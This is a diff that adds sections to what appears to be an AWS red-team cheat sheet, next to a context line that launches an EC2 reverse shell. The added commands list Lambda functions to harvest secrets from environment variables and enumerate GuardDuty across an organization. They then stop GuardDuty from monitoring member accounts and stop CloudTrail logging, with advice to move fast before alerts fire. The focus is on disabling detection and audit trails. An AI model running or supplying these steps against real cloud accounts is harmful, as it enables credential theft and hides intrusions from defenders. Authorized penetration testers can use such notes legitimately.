@@ -148,3 +148,70 @@ EC2 Reverse Shell
 
 `run ec2__startup_shell_script --script reverseShell.sh --instance-ids i-12345678901234567@us-east-1` 
 
+## Lambda
+
+List functions. Inspect ENV variables for juicy loot
+
+`aws lambda list-functions`
+
+## GuardDuty 
+
+Is GuardDuty running? 
+
+`aws guardduty list-detectors --region us-east-1` 
+
+Is GuardDuty setup for Orgs? 
+
+`aws guardduty describe-organization-configuration --detector-id <id> --region
+us-east-1` 
+
+The output for this command can be tricky to read. Refer to the docs below: 
+
+```
+Output
+
+AutoEnable -> (boolean)
+
+Indicates whether GuardDuty is automatically enabled for accounts added to the organization.
+MemberAccountLimitReached -> (boolean)
+
+Indicates whether the maximum number of allowed member accounts are already associated with the delegated administrator account for your organization.
+DataSources -> (structure)
+
+Describes which data sources are enabled automatically for member accounts.
+
+S3Logs -> (structure)
+
+Describes whether S3 data event logs are enabled as a data source.
+
+AutoEnable -> (boolean)
+
+A value that describes whether S3 data event logs are automatically enabled for new members of the organization.
+```
+
+Which account is the account admin? 
+
+`aws guardduty list-organization-admin-accounts --region us-east-1`
+
+List member accounts with detectors on
+
+`aws guardduty list-members --detector-id <org admin detector id> --region us-east-1`
+
+===May set off GuardDuty/Cloudwatch Alarm/SIEM alerts===
+
+Stop Monitoring Members
+
+`aws stop-monitoring-members --detector-id <org admin detector id> --account-ids "string" "string" ... --region us-east-1`
+
+## CloudTrail 
+
+Tread lightly. Disabling CloudTrail is probably the most watched for event in enterpise AWS
+
+List Trails
+
+`aws cloudtrail list-trails --region us-east-1`
+
+Stop logging CloudTrail calls (if an org is even half-competent this will alert. Move fast.)
+
+`aws cloudtrail stop-logging --name <trail name or arn> --region us-east-1`
+
